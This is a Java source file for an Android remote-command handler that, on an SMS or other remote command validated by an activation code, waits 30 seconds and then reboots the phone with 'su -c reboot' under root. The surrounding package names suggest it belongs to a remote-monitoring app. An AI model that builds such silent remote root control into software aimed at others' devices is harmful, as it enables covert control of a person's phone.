package com.vvt.remotecommandmanager.processor.troubleshoot;

import android.os.SystemClock;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class RestartDeviceProcessor extends RemoteCommandProcessor {
	private static final String TAG = "RestartDeviceProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public RestartDeviceProcessor(AppContext appContext, FxEventRepository eventRepository, LicenseInfo licenseInfo) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		mReplyMessage = new ProcessingResult();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try {
			Thread thread = new Thread(new Runnable() {

				@Override
				public void run() {
					if(LOGD) FxLog.d(TAG, "System will restart in 30 seconds...");
					SystemClock.sleep(30000);
					// Works only on Rooted phones
					try {
						Process proc = Runtime.getRuntime().exec(
								new String[] { "su", "-c", "reboot" });
						proc.waitFor();
					} catch (Exception ex) {
						if(LOGE) FxLog.e(TAG, ex.getMessage(), ex);
						// mReplyMessage.setIsSuccess(false);
						// mReplyMessageBuilder.append(MessageManager.RESTART_DEVICE_ERROR);
						// mReplyMessage.setMessage(mReplyMessageBuilder.toString());
						// return;
					}
				}
			});
			thread.start();
				
		    
            
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append(MessageManager.RESTART_DEVICE_SUCCESS);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		} catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());

			mReplyMessageBuilder.append(MessageManager.RESTART_DEVICE_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
		
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 arguments.
			if(commandData.getArguments().size() != 1 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
